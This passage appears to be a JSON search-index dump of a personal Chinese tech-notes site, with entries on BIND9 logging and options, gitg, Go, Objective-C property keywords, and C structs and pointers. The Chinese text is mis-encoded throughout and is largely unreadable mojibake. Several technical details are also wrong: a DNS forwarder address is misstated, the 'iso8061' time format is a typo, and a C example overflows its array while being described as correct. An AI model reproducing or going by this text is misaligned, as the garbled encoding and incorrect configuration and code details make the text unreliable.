lame-serversï¼š è¿œç¨‹æœåŠ¡å™¨ä¸­çš„é”™è¯¯é…ç½®ï¼ŒBIND 9åœ¨è§£ææœŸé—´è¯•å›¾æŸ¥è¯¢è¿™äº›æœåŠ¡å™¨æ—¶å‘ç°ï¼› networkï¼š ç½‘ç»œæ“ä½œï¼› notifyï¼š é€šçŸ¥åè®®ï¼› queriesï¼šè®°å½•æ‰€æœ‰æŸ¥è¯¢ DNSæœåŠ¡å™¨çš„ queryï¼› query-errorsï¼š å…³äºå¯¼è‡´æŸäº›å¤±è´¥çš„æŸ¥è¯¢çš„ä¿¡æ¯ï¼› xfer-inï¼šåŒºåŸŸä¼ è¾“æœåŠ¡å™¨æ­£åœ¨æ¥æ”¶ï¼› xfer-outï¼šåŒºåŸŸä¼ è¾“æœåŠ¡å™¨æ­£åœ¨å‘é€çš„ä¿¡æ¯ï¼› zoneloadï¼šåŠ è½½åŒºåŸŸå’Œåˆ›å»ºè‡ªåŠ¨ç©ºåŒºåŸŸï¼› æ€ä¹ˆé…ç½®è¿™ä¸ªæœåŠ¡ é…ç½®çš„ logging æœåŠ¡ä¼šåˆ›å»ºæŒ‡å®šçš„æ—¥å¿—æ–‡ä»¶ï¼Œè¯¥æ—¥å¿—æ–‡ä»¶ä»æœåŠ¡æŒ‚èµ·çš„æ—¶å€™è¢«åˆ›å»ºï¼Œç”¨äºè®°å½•DNSæœåŠ¡ä¸­çš„ç›¸å…³çš„é…ç½®ä¿¡æ¯ä»¥åŠäº¤æ¢ä¿¡æ¯ã€‚ åœ¨ Debian9 çš„é»˜è®¤å­˜å‚¨ç›®å½•ä¸º /var/cache/bind/*. ä¹Ÿå¯ä»¥ä¸ºå…¶æŒ‡å®šä½ æƒ³è¦å­˜å‚¨çš„ä½ç½®. æˆ‘ä¸ªäººå–œæ¬¢å°† BIND æ—¥å¿—å’Œç³»ç»Ÿæ—¥å¿—ä¿å­˜åœ¨ä¸€èµ·ï¼Œå³ä¿å­˜è·¯å¾„ä¸ºï¼š/var/log/bindã€‚ è¿™ä¸ªè·¯å¾„ä¸æ˜¯åœ¨ä½ å®‰è£… BIND æ—¶å€™å°±å·²ç»åˆ›å»ºäº†ï¼Œéœ€è¦ä½ è‡ªå·±åˆ›å»ºå¯¹åº”çš„æ–‡ä»¶ç›®å½•ï¼› å¦‚æœä½ æƒ³è¦é…ç½®æˆä¸€ä¸ªè‡ªå·±çš„ç›®å½•ï¼Œé¦–å…ˆä½ éœ€è¦åˆ›å»ºä¸€ä¸ªè‡ªå®šä¹‰çš„ç›®å½•ï¼Œæ¯”å¦‚è¯´æˆ‘æŒ‡å®šäº†æˆ‘æƒ³è¦å­˜æ”¾æ—¥å¿—çš„æ–‡ä»¶çš„ç›®å½•ï¼š /var/log/bindï¼Œå¦‚æœä¸ä¸ºè¿™ä¸ªæ–‡ä»¶ä½¿ç”¨chownå‘½ä»¤æŒ‡å®šæƒé™çš„è¯ä¼šå‡ºç° isc_stdio_open '/var/log/example.log' failed çš„æŠ¥é”™ï¼š é¦–å…ˆä½ å¿…é¡»æ‰‹åŠ¨åˆ›å»ºè‡ªå·±çš„æ–‡ä»¶åˆ°æŒ‡å®šç›®å½•ä¸‹ï¼› è§£å†³æ–¹æ³•æ˜¯: sudo chown bind:root /var/log/bind/* ï¼› ç°åœ¨æˆ‘ä»¬å·²ç»åŸºæœ¬ä¸Šäº†è§£äº† logging çš„å·¥ä½œåŸç†. å…¶å·¥ä½œæœºåˆ¶ç®€å•åœ°æ¥è¯´å°±æ˜¯ï¼Œé¦–å…ˆä½ éœ€è¦åˆ›å»ºä¸€ä¸ª channel æ¥è§„å®šè¾“å‡ºæ—¥å¿—æµçš„æ ¼å¼è¿˜ä»¥åŠæ—¥å¿—æ–‡ä»¶åã€æ–‡ä»¶ç‰ˆæœ¬. æ¯ä¸€ä¸ª channel å¯ä»¥è¢«å¤šä¸ª category è°ƒç”¨ä½¿ç”¨ï¼Œ æ¯ä¸€ä¸ª category ç›¸å½“äºä¸€ä¸ª BIND9 å†…åµŒçš„æœåŠ¡æ¨¡å—ï¼Œ æœåŠ¡æ¨¡å—å»è°ƒç”¨æ—¥å¿—é…ç½®æ¨¡æœ€åè¾“å‡ºæ ¼å¼åŒ–æ—¥å¿—ã€‚ åœ¨è¿™é‡Œæˆ‘ä¹‹å‰å¹¶æ²¡æœ‰ç»™å‡ºå¯¹åº”çš„é…ç½®ç¤ºä¾‹ï¼Œç°åœ¨ç»™å‡ºç¤ºä¾‹: // named.conf.options æ–‡ä»¶ä¸­ç»™å‡ºloggingçš„é…ç½®ç¤ºä¾‹ logging { // åœ¨æˆ‘è‡ªå·±ä½¿ç”¨BINDè¿›è¡ŒDNSè§£æçš„æ—¶å€™ï¼Œå‡ºç°äº† TIME_OUT çš„ç›¸å…³é”™è¯¯ï¼Œè¿™ä¸ªé”™è¯¯æ˜¯éœ€è¦åœ¨ client è¿›è¡Œæ—¥å¿—è®°å½• // å› æ­¤å¯¹äºå®¢æˆ·ç«¯çš„è§£æéœ€è¦æœ‰ç›¸å…³çš„æ—¥å¿—é…ç½®ï¼Œæ‰èƒ½å‘ç°åœ¨è§£ææ—¶çš„é—®é¢˜ // // // category client { default_client; } // æŒ‡å®š client æ‰€æœ‰çš„é”™è¯¯ channel default_client { file \"/var/log/bind/err/client.log\" version 1 size 20m print-category yes; print-time iso8061; severity debug 3; } } options options çš„å‚æ•°è®¾ç½®ä¼šå½±å“æ•´ä¸ª BIND9 DNSç¯å¢ƒçš„é…ç½®ï¼Œå…·ä½“å„éƒ¨åˆ†å¸¸ç”¨åˆ°çš„é…ç½®å‚æ•°å¦‚ä¸‹ listen-onï¼š ç”¨äºé…ç½®ç›‘å¬çš„ç«¯å£ä»¥åŠIPv4åœ°å€ï¼Œé»˜è®¤çš„ç›‘å¬ç«¯å£ä¸ºï¼š53ï¼› listen-on-v6ï¼šç”¨äºç›‘å¬ IPv6 åœ°å€ä»¥åŠç«¯å£ï¼› directory: ç”¨äºæŒ‡å®šè¯»å–DNSæ•°æ®æ–‡ä»¶çš„æ–‡ä»¶å¤¹ï¼Œé»˜è®¤çš„æ–‡ä»¶å¤¹çš„è·¯å¾„ä¸ºï¼š/var/cache/bindï¼› dump-fileï¼šé€‰é¡¹ç”¨æ¥è®¾ç½®åŸŸåç¼“å­˜æ•°æ®åº“æ–‡ä»¶çš„ä½ç½®ï¼Œå¯ä»¥è‡ªå·±å®šä¹‰ã€‚é»˜è®¤çš„å­˜å‚¨æ–‡ä»¶ä¸ºï¼šnamed_dump.dbï¼› statistics-fileï¼šé€‰é¡¹ç”¨æ¥è®¾ç½®çŠ¶æ€ç»Ÿè®¡æ–‡ä»¶çš„ä½ç½®ï¼Œå¯ä»¥è‡ªå·±å®šä¹‰ã€‚ï¼› memstatistics-file ï¼šé€‰é¡¹ç”¨æ¥è®¾ç½®æœåŠ¡å™¨è¾“å‡ºçš„å†…å­˜ä½¿ç”¨ç»Ÿè®¡ä¿¡æ¯ã€‚é»˜è®¤ä¿å­˜åœ¨ /var/named/data ç›®å½•ä¸‹ï¼Œæ–‡ä»¶åä¸º named.memstatsï¼› allow-queryï¼šé€‰é¡¹ç”¨æ¥è®¾ç½®å…è®¸DNSæŸ¥è¯¢çš„å®¢æˆ·ç«¯åœ°å€ï¼Œé»˜è®¤å€¼ä¸ºlocalhost, å¯ä»¥è®¾ç½®ä¸ºæŸä¸ªç½‘æ®µã€ä»»æ„åœ°å€ã€å…·ä½“çš„æŸå°ä¸»æœºä¸‰ç§æƒ…å†µã€‚ä¾‹å¦‚ï¼Œè¦ä¿®æ”¹ä¸ºä»»æ„åœ°å€ï¼Œå°±åœ¨æ‹¬å·å†…çš„åŠ å…¥ anyï¼Œä¹Ÿå¯ä»¥å¼•ç”¨ä¹‹å‰åˆ›å»ºçš„ acl å†…çš„æ‰€æœ‰åœ°å€ï¼› recursionï¼šç”¨äºè®¾ç½®é€’å½’æŸ¥è¯¢ï¼Œä¸€èˆ¬å®¢æˆ·æœºå’ŒæœåŠ¡å™¨ä¹‹é—´å±äºé€’å½’æŸ¥è¯¢ï¼Œå³å½“å®¢æˆ·æœºå‘DNSæœåŠ¡å™¨å‘å‡ºæŸ¥è¯¢è¯·æ±‚åï¼Œè‹¥DNSæœåŠ¡å™¨æœ¬èº«ä¸èƒ½è§£æï¼Œåˆ™ä¼šå‘å¦å¤–çš„DNSæœåŠ¡å™¨å‘å‡ºæŸ¥è¯¢è¯·æ±‚ï¼Œå¾—åˆ°ç»“æœåè½¬äº¤ç»™å®¢æˆ·æœºã€‚æ­¤é€‰é¡¹æœ‰yeså’Œnoä¸¤ä¸ªå€¼ã€‚è¿™ä¸ªé€‰é¡¹ç”¨äºè®¾ç½® Failover éå¸¸æœ‰ç”¨ï¼› dnssec-enableï¼š é€‰é¡¹ç”¨æ¥è®¾ç½®æ˜¯å¦å¯ç”¨DNSSECæ”¯æŒï¼ŒDNSSECå¯ä»¥ç”¨æ¥éªŒè¯DNSæ•°æ®çš„æœ‰æ•ˆæ€§ï¼Œè¯¥é€‰é¡¹æœ‰yeså’Œnoä¸¤ä¸ªå€¼ï¼Œé»˜è®¤å€¼ä¸ºyesã€‚ dnssec-validationï¼šé€‰é¡¹ç”¨æ¥è®¾ç½®æ˜¯å¦å¯ç”¨DNSSECç¡®è®¤ï¼Œé»˜è®¤å€¼ä¸ºyesï¼Œå¯ä»¥é€‰æ‹© autoã€‚ bindkeys-file ï¼š ç”¨æ¥è®¾ç½®å†…ç½®ä¿¡ä»»çš„å¯†é’¥æ–‡ä»¶ï¼Œå…¶é»˜è®¤å€¼ä¸º /etc/named/iscdlv.keyï¼› managed-keys-directoryï¼š é€‰é¡¹ç”¨äºæŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å­˜å‚¨ä½ç½®ï¼Œè·Ÿè¸ªç®¡ç† DNSSEC å¯†é’¥ï¼Œ è¿™éƒ¨åˆ†çš„å†…å®¹åœ¨åè¾¹ä¼šæœ‰ä»‹ç»ï¼› forwardersï¼šDNSè½¬å‘å™¨ã€‚ç”¨äºè®¾å®šè¯¥DNSè§£ææœåŠ¡å™¨æ— æ³•è¿›è¡Œå½“å‰åŸŸåè§£æçš„æƒ…å†µä¸‹ï¼Œè¿›è¡Œè½¬å‘è§£æçš„DNSåœ°å€ï¼Œå…¶ä¸­ 8.8.8.8 å’Œ 8.8.4.4 æ˜¯è°·æ­Œçš„å…è´¹DNSæœåŠ¡å™¨çš„ç½‘ç»œåœ°å€ï¼›233.5.5.5 å’Œ 233.6.6.6 æ˜¯é˜¿é‡Œäº‘çš„å…è´¹DNSåœ°å€ã€‚å½“è®¾ç½®äº† forwarder çš„è½¬å‘å™¨ä¹‹åï¼Œæ‰€æœ‰çš„éæœ¬åŸŸçš„å’Œåœ¨ç¼“å­˜ä¸­æ— æ³•æŸ¥æ‰¾åˆ°çš„åŸŸåæŸ¥è¯¢éƒ½è½¬å‘éƒ½è®¾ç½®çš„DNSè½¬å‘å™¨ï¼Œç”±DNSè½¬å‘å™¨ å®Œæˆè½¬å‘æ“ä½œã€‚å› æ­¤è¿™å°è½¬å‘å™¨çš„ç¼“å­˜ä¸­å°±è®°å½•äº†ä¸°å¯Œçš„åŸŸåä¿¡æ¯ã€‚å› æ­¤å¦‚æœé‡åˆ°éæœ¬åŸŸçš„æŸ¥è¯¢ï¼Œè½¬å‘å™¨çš„ç¼“å­˜å°±å¯ä»¥åšåˆ°æŸ¥è¯¢ï¼Œä»è€Œå‡å°‘äº†å‘å¤–éƒ¨çš„æŸ¥è¯¢æµé‡ã€‚ forward: é€‰æ‹©é»˜è®¤çš„IPåœ°å€å³å¯ï¼› rrset-orderï¼š åœ¨ BIND 9 æä¾›çš„è´Ÿè½½å‡è¡¡ç­–ç•¥å»ºç«‹åœ¨ä¸€ä¸ªåç§°ï¼ˆåŸŸå - Nameï¼‰ä½¿ç”¨å¤šä¸ªèµ„æºè®°å½• ( Records ) çš„æƒ…å†µä¸‹ï¼Œå…¶å®ç°çš„è½®è¯¢æœºåˆ¶å¹¶ä¸æ˜¯ä¼ ç»Ÿçš„è´Ÿè½½å‡è¡¡æœåŠ¡å™¨å®ç°çš„è½®è¯¢æœºåˆ¶ - å³è¿½è¸ªå’Œè®°å½•æ¯ä¸€æ¬¡åº”ç­”çš„èµ„æºé¡ºåºï¼› BIND 9 å®ç°äº†ä¸€ä¸ªç±»ä¼¼ List çš„æ•°æ®ç»“æ„ï¼Œå°†æ‰€æœ‰çš„èµ„æºè®°å½•å¡«å…¥åˆ° ä¸€ä¸ªé¡ºåºè¡¨ä¸­ï¼Œè¿™ä¸ªå¡«å…¥çš„æ¬¡åºéšæœºï¼Œæˆ–è€…æ ¹æ®è®¾å®šçš„å‚æ•°éšæœºï¼› æ ¼å¼: [class class_name] [type type_name] [name \"domain_name\"] order ordering å¦‚æœå‚æ•°æ²¡æœ‰è¢«èµ‹å€¼ï¼Œé‚£ä¹ˆé»˜è®¤çš„èµ‹å€¼ä¸º: class: ANY type: ANY Name: * å‚æ•°: fixed ï¼š æ ¹æ® zone æ–‡ä»¶å®šä¹‰èµ„æºè®°å½•çš„é¡ºåºæŒ‰ç…§é¡ºåºé€ä¸ªè¿›è¡Œè§£æï¼› randomï¼š æ ¹æ® zone æ–‡ä»¶èµ„æºè®°å½•éšæœºè¿”å›è§£æè®°å½•ï¼› cyclicï¼š åˆ›å»ºä¸€ä¸ªå¾ªç¯ï¼Œå¾ªç¯è¾“å‡ºèµ„æºè®°å½•ï¼› noneï¼š å®Œå…¨éšæœºçš„èµ„æºè¿”å›å½¢å¼ï¼› controls controlsè¯­å¥å£°æ˜äº†ç³»ç»Ÿç®¡ç†å‘˜ç”¨äºç®¡ç†åç§°æœåŠ¡å™¨è¿œç¨‹æ“ä½œçš„æ§åˆ¶é€šé“ã€‚ rndcä½¿ç”¨è¿™äº›æ§åˆ¶é€šé“å‘åç§°æœåŠ¡å™¨å‘é€å‘½ä»¤ï¼Œå¹¶ä»åç§°æœåŠ¡å™¨æ£€ç´¢édnsç»“æœã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-package-bind9-software-package.html","loc":"/yq-doc-source-docs-operating-system-linux-package-bind9-software-package.html"},{"title":"gitg","text":"ä¸€ä¸ªå›¾å½¢åŒ–gitå·¥å…·, æ”¯æŒä¾¿æ·çš„æŸ¥çœ‹gitæäº¤ç­‰. å®‰è£…: apt install gitg æ‰§è¡Œ, ç›´æ¥è¾“å…¥å‘½ä»¤å³å¯æ‰“å¼€å›¾å½¢ç•Œé¢: gitg","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-package-gitg.html","loc":"/yq-doc-source-docs-operating-system-linux-package-gitg.html"},{"title":"Go","text":"Goå­¦ä¹ è®°å½•, 24.01.29 ç¬¬ä¸€ç‰ˆæºäº Go è¯­è¨€æ•™ç¨‹ ç‰¹è‰² ç®€æ´ã€å¿«é€Ÿã€å®‰å…¨ å¹¶è¡Œã€æœ‰è¶£ã€å¼€æº å†…å­˜ç®¡ç†ã€æ•°ç»„å®‰å…¨ã€ç¼–è¯‘è¿…é€Ÿ ç”¨é€” Go è¯­è¨€è¢«è®¾è®¡æˆä¸€é—¨åº”ç”¨äºæ­è½½ Web æœåŠ¡å™¨ï¼Œå­˜å‚¨é›†ç¾¤æˆ–ç±»ä¼¼ç”¨é€”çš„å·¨å‹ä¸­å¤®æœåŠ¡å™¨çš„ç³»ç»Ÿç¼–ç¨‹è¯­è¨€ã€‚ å¯¹äºé«˜æ€§èƒ½åˆ†å¸ƒå¼ç³»ç»Ÿé¢†åŸŸè€Œè¨€ï¼ŒGo è¯­è¨€æ— ç–‘æ¯”å¤§å¤šæ•°å…¶å®ƒè¯­è¨€æœ‰ç€æ›´é«˜çš„å¼€å‘æ•ˆç‡ã€‚ å®ƒæä¾›äº†æµ·é‡å¹¶è¡Œçš„æ”¯æŒï¼Œè¿™å¯¹äºæ¸¸æˆæœåŠ¡ç«¯çš„å¼€å‘è€Œè¨€æ˜¯å†å¥½ä¸è¿‡äº†ã€‚ Macä¸‹å®‰è£…: brew install go","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-GO-index.html","loc":"/yq-doc-source-docs-rear-end-GO-index.html"},{"title":"Object-C","text":"Macä¸Šæ¯”è¾ƒæ—§çš„å¼€å‘è¯­è¨€ ä¸€äº›å…³é”®å­— nonatomic nonatomic æ˜¯ä¸€ä¸ªçº¿ç¨‹å®‰å…¨ç›¸å…³çš„å±æ€§ä¿®é¥°ç¬¦ã€‚ å®ƒç”¨äºæŒ‡å®šå±æ€§çš„è®¿é—®æ–¹æ³•ï¼ˆgetter å’Œ setterï¼‰åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸‹ä¸éœ€è¦è¿›è¡ŒåŠ é”æ“ä½œã€‚ ä½¿ç”¨ nonatomic ä¿®é¥°çš„å±æ€§è®¿é—®ä¼šæ›´å¿«ï¼Œä½†åœ¨å¹¶å‘è®¿é—®æ—¶å¯èƒ½ä¼šå‡ºç°æ•°æ®ç«äº‰å’Œä¸ä¸€è‡´çš„é—®é¢˜ã€‚ å¦‚æœè½¬æ¢ä¸ºSwift, Swift ä¸­çš„å±æ€§é»˜è®¤æ˜¯éåŸå­çš„ï¼Œå› æ­¤ä¸éœ€è¦æ˜¾å¼æŒ‡å®š nonatomicã€‚ å¦‚æœä½ éœ€è¦åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸­è®¿é—®å±æ€§ï¼Œå¹¶ç¡®ä¿çº¿ç¨‹å®‰å…¨ï¼Œå¯ä»¥ä½¿ç”¨å…¶ä»–æ‰‹æ®µæ¥ä¿è¯ï¼Œä¾‹å¦‚ä½¿ç”¨ä¸²è¡Œé˜Ÿåˆ—æˆ–é”ã€‚ retain retain æ˜¯æŒ‡å®šå±æ€§çš„å†…å­˜ç®¡ç†è¯­ä¹‰çš„ä¿®é¥°ç¬¦ã€‚ åœ¨å¼•ç”¨è®¡æ•°å†…å­˜ç®¡ç†æ¨¡å‹ä¸­ï¼Œå®ƒç”¨äºå¢åŠ è¢«å¼•ç”¨å¯¹è±¡çš„å¼•ç”¨è®¡æ•°ï¼Œå¹¶åœ¨ä¸å†éœ€è¦æ—¶é‡Šæ”¾å¼•ç”¨è®¡æ•°ã€‚ retain è¡¨ç¤ºå±æ€§æ˜¯ä¸€ä¸ª å¼ºå¼•ç”¨ ï¼Œå®ƒä¼šåœ¨è®¾ç½®æ–°å€¼æ—¶è‡ªåŠ¨å¢åŠ å¼•ç”¨è®¡æ•°ï¼Œå¹¶åœ¨ä¸å†éœ€è¦æ—¶é€‚æ—¶é‡Šæ”¾å¼•ç”¨è®¡æ•°ã€‚ å¦‚æœè½¬æ¢ä¸ºSwift, åœ¨ Swift ä¸­ï¼Œé»˜è®¤ä½¿ç”¨å¼ºå¼•ç”¨æ¥ç®¡ç†å†…å­˜ï¼Œå› æ­¤ä¸éœ€è¦æ˜¾å¼æŒ‡å®š retainã€‚ å±æ€§çš„å¼•ç”¨è®¡æ•°ä¼šåœ¨ä¸å†è¢«å¼•ç”¨æ—¶è‡ªåŠ¨å‡å°‘ï¼Œå¹¶åœ¨åˆé€‚çš„æ—¶æœºé‡Šæ”¾å†…å­˜ã€‚ weak weak æ˜¯ä¸€ç§å±æ€§ä¿®é¥°ç¬¦ï¼Œåœ¨ Swift ä¸­ç”¨äºåˆ›å»º å¼±å¼•ç”¨ï¼ˆweak referenceï¼‰ . å®ƒä¸»è¦ç”¨äºè§£å†³å¾ªç¯å¼•ç”¨ï¼ˆretain cycleï¼‰çš„é—®é¢˜ï¼Œå¹¶å¸®åŠ©ç®¡ç†å†…å­˜ã€‚ ä»¥ä¸‹æ˜¯ weak ä¿®é¥°ç¬¦çš„ä½œç”¨å’Œç‰¹ç‚¹ï¼š å¼±å¼•ç”¨ï¼šä½¿ç”¨ weak ä¿®é¥°çš„å±æ€§åˆ›å»ºçš„å¼•ç”¨æ˜¯å¼±å¼•ç”¨ã€‚ å¼±å¼•ç”¨ä¸ä¼šå¢åŠ å¯¹è±¡çš„å¼•ç”¨è®¡æ•°ï¼Œå½“æ‰€å¼•ç”¨çš„å¯¹è±¡è¢«é‡Šæ”¾æ—¶ï¼Œå¼±å¼•ç”¨ä¼šè‡ªåŠ¨è®¾ç½®ä¸º nilã€‚ è¿™æœ‰åŠ©äºé¿å…å¾ªç¯å¼•ç”¨ï¼Œä»è€Œé˜²æ­¢å†…å­˜æ³„æ¼ã€‚ è§£å†³å¾ªç¯å¼•ç”¨ï¼šå¾ªç¯å¼•ç”¨æŒ‡çš„æ˜¯ä¸¤ä¸ªæˆ–å¤šä¸ªå¯¹è±¡ä¹‹é—´å½¢æˆçš„ç›¸äº’å¼ºå¼•ç”¨å…³ç³»ï¼Œå¯¼è‡´å®ƒä»¬æ— æ³•è¢«æ­£ç¡®é‡Šæ”¾ã€‚ è¿™å¯èƒ½ä¼šå¯¼è‡´å†…å­˜æ³„æ¼ï¼Œå› ä¸ºå¯¹è±¡æ— æ³•è¢«åƒåœ¾å›æ”¶ã€‚ é€šè¿‡åœ¨å…¶ä¸­ä¸€ä¸ªå¯¹è±¡çš„å±æ€§ä¸Šä½¿ç”¨ weak ä¿®é¥°ç¬¦ï¼Œå¯ä»¥æ‰“ç ´å¾ªç¯å¼•ç”¨ï¼Œä½¿å…¶ä¸­ä¸€ä¸ªå¯¹è±¡æˆä¸ºå¼±å¼•ç”¨ã€‚ è‡ªåŠ¨è®¾ç½®ä¸º nilï¼šå½“æ‰€å¼•ç”¨çš„å¯¹è±¡è¢«é‡Šæ”¾æ—¶ï¼Œå¼±å¼•ç”¨ä¼šè‡ªåŠ¨è®¾ç½®ä¸º nilã€‚ è¿™æ„å‘³ç€ä½ å¯ä»¥å®‰å…¨åœ°ä½¿ç”¨å¼±å¼•ç”¨ï¼Œè€Œä¸å¿…æ‹…å¿ƒè®¿é—®å·²é‡Šæ”¾çš„å¯¹è±¡ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåªæœ‰åœ¨å¼•ç”¨å¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸå¯èƒ½æ¯”å¼•ç”¨å®ƒçš„å¯¹è±¡çŸ­æ—¶ï¼Œæ‰é€‚åˆä½¿ç”¨å¼±å¼•ç”¨ã€‚ å¦‚æœå¼•ç”¨å¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸä¸å¼•ç”¨å®ƒçš„å¯¹è±¡ç›¸åŒæˆ–æ›´é•¿ï¼Œé‚£ä¹ˆä½¿ç”¨å¼±å¼•ç”¨å¯èƒ½ä¼šå¯¼è‡´è®¿é—®å·²é‡Šæ”¾å¯¹è±¡çš„é”™è¯¯ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-Object-C-index.html","loc":"/yq-doc-source-docs-rear-end-Object-C-index.html"},{"title":"åŸºç¡€çŸ¥è¯†C(++)","text":"ç»“æ„ä½“ å®šä¹‰ å®šä¹‰: struct $tag { $c_type arg1; $c_type arg2; ... } arg_list; struct æ˜¯å…³é”®å­—è¡¨ç¤ºå®šä¹‰ç»“æ„ä½“ tag æ˜¯ç»“æ„é¢˜æ ‡ç­¾, ç›¸å½“äºPythonçš„ç±» c_type arg1 è¡¨ç¤ºå®šä¹‰ç»“æ„é¢˜å†…å…·ä½“çš„æˆå‘˜å˜é‡, æ¯”å¦‚ int x arg_list æ˜¯å½“å‰ç»“æ„ä½“å˜é‡å, å¯ä»¥ä¸ºå¤šä¸ª. å¯ä»¥ç†è§£ä¸º tag æ ‡ç­¾å®ä¾‹åŒ–äº†å¤šä¸ªç±» æ³¨è§£ ç»“æ„ä½“æ ‡ç­¾, æˆå‘˜å˜é‡å®šä¹‰, ç»“æ„é¢˜å˜é‡å. å®šä¹‰æ—¶, è‡³å°‘éœ€è¦å…¶ä¸­ä¸¤ä¸ª, å¦åˆ™é”™è¯¯. å¦‚, ä»¥ä¸‹å£°æ˜äº†æ‹¥æœ‰3ä¸ªæˆå‘˜çš„ç»“æ„ä½“ï¼Œåˆ†åˆ«ä¸ºæ•´å‹çš„aï¼Œå­—ç¬¦å‹çš„bå’ŒåŒç²¾åº¦çš„c: //ç»“æ„ä½“çš„æ ‡ç­¾è¢«å‘½åä¸ºSIMPLE,æ²¡æœ‰å£°æ˜å˜é‡ struct SIMPLE { int a; char b; double c; }; //ç”¨SIMPLEæ ‡ç­¾çš„ç»“æ„ä½“ï¼Œå¦å¤–å£°æ˜äº†å˜é‡t1ã€t2ã€t3 struct SIMPLE t1, t2[20], *t3; ç­‰ä»·ä¸: struct SIMPLE { int a; char b; double c; } t1, t2[20], *t3; åˆå§‹åŒ– åˆå§‹åŒ–: #include <stdio.h> struct Books { char title[50]; char author[50]; char subject[100]; int book_id; } book = {\"æ ‡é¢˜\", \"ä½œè€…\", \"C\", 1111}; // è®¿é—®ä½¿ç”¨ . , å¦‚ book.book_id è®¿é—® ç»“æ„ä½“æœ¬èº«ç”¨ . è®¿é—® ç»“æ„é¢˜æŒ‡é’ˆç”¨ -> è®¿é—® ç”¨ä¾‹: typedef é‡æ–°å®šä¹‰å·²æœ‰å˜é‡ã€ç±»å‹ç­‰ charæ•°ç»„èµ‹å€¼ åˆå§‹åŒ–ç›´æ¥èµ‹å€¼: char a[20] = \"hello\"; æ•°ç»„é€ä¸ªèµ‹å€¼: char a[20] = {'h', 'e', 'l', 'l', 'o'}; strcpyæ‹·è´èµ‹å€¼: char a[20]; strcpy(a, \"hello\") å…¶ä»–: char const *se = \"hello\"; ç­‰ä»·ä¸: char const *see; see = \"hello\"; æ³¨è§£ char const *se = \"hello\"; éœ€è¦åŠ  const æ˜¯å› ä¸ºcharè¡¨ç¤ºå­—ç¬¦å¸¸é‡, ä¸å…è®¸è¢«ä¿®æ”¹. å•/åŒå¼•å· å•å¼•å·å¼•ç”¨å•ä¸ªå­—ç¬¦, è¡¨ç¤ºå­—ç¬¦å­—é¢é‡, å ç”¨ä¸€ä¸ªå­—ç¬¦, ä»£è¡¨æ•´æ•°, æ•´æ•°å€¼å¯¹åº”äºè¯¥å­—ç¬¦åœ¨ç¼–è¯‘å™¨é‡‡ç”¨çš„å­—ç¬¦é›†ä¸­çš„åºåˆ—å€¼(ä¸€èˆ¬ç¼–è¯‘å™¨é‡‡ç”¨çš„éƒ½æ˜¯ASCIIå­—ç¬¦é›†) åŒå¼•å·å¼•ç”¨å­—ç¬¦ä¸²å¸¸é‡, è¡¨ç¤ºå­—ç¬¦ä¸²å­—é¢é‡, å ç”¨ä¸ºæ‰€æœ‰å­—ç¬¦ä¸ªæ•°åŠ ä¸€, å› ä¸ºæ¯ä¸ªå­—ç¬¦ä¸²æœ«å°¾è‡ªåŠ¨ä¼šåŠ ä¸Šä¸€ä¸ªç©ºå­—ç¬¦ '0', ä»£è¡¨å­—ç¬¦æŒ‡é’ˆ, æŒ‡å‘å­—ç¬¦æ•°ç»„é¦–åœ°å€. å¦‚ \"a\"+1 è¡¨ç¤ºæŒ‡é’ˆè¿ç®—, æŒ‡å‘ç»“æŸç¬¦ '0'. ç©ºå­—ç¬¦å¸¸é‡ '0' ç©ºç™½å­—ç¬¦ä¸² \"\" æŒ‡é’ˆ æŒ‡é’ˆä¹Ÿæ˜¯ä¸€ç§å˜é‡ï¼Œåªä¸è¿‡å®ƒçš„å†…å­˜å•å…ƒä¸­ä¿å­˜çš„æ˜¯ä¸€ä¸ªæ ‡è¯†å…¶ä»–ä½ç½®çš„åœ°å€ã€‚ã€‚ç”±äºåœ°å€ä¹Ÿæ˜¯æ•´æ•°ï¼Œåœ¨ï¼“ï¼’ä½å¹³å°ä¸‹ï¼ŒæŒ‡é’ˆé»˜è®¤ä¸ºï¼“ï¼’ä½ã€‚ã€‚ æŒ‡å‘çš„ç›´æ¥æ„æ€å°±æ˜¯æŒ‡é’ˆå˜é‡æ‰€ä¿å­˜çš„å…¶ä»–çš„åœ°å€å•å…ƒä¸­æ‰€å­˜æ”¾çš„æ•°æ®ç±»å‹: int *p ; //p å˜é‡ä¿å­˜çš„åœ°å€æ‰€åœ¨å†…å­˜å•å…ƒä¸­çš„æ•°æ®ç±»å‹ä¸ºæ•´å‹ float *q; // ... æµ®ç‚¹å‹ ä¸è®ºæŒ‡å‘çš„æ•°æ®ç±»å‹ä¸ºé‚£ç§ï¼ŒæŒ‡é’ˆå˜é‡å…¶æœ¬èº«æ°¸è¿œä¸ºæ•´å‹ï¼Œå› ä¸ºå®ƒä¿å­˜çš„åœ°å€ã€‚ Cè¯­è¨€ä¸­å®šä¹‰ä¸€ä¸ªå˜é‡æ—¶å¯ä»¥åˆå§‹åŒ–: char str[10] = {\"hello world\"}; å½“ç¼–è¯‘å™¨é‡åˆ°è¿™å¥æ—¶ï¼Œä¼šæŠŠstræ•°ç»„ä¸­ä»ç¬¬ä¸€ä¸ªå…ƒç´ æŠŠhello world0 é€ä¸ªå¡«å…¥ã€‚ã€‚ Cè¯­è¨€ä¸­è§„å®šæ•°ç»„ä»£è¡¨æ•°ç»„æ‰€åœ¨å†…å­˜ä½ç½®çš„é¦–åœ°å€ï¼Œä¹Ÿæ˜¯ str[0]çš„åœ°å€ï¼Œå³: str = &str[0]; è€Œprintf(\"%s\",str); ä¸ºä»€ä¹ˆç”¨é¦–åœ°å€å°±å¯ä»¥è¾“å‡ºå­—ç¬¦ä¸², å› ä¸ºè¿™é‡Œç»™çš„ä¹Ÿæ˜¯åœ°å€. å³æ‰“å°å‡ºçš„ç»“æœä¸ºå˜é‡åœ°å€æ‰€æŒ‡å‘çš„å€¼. 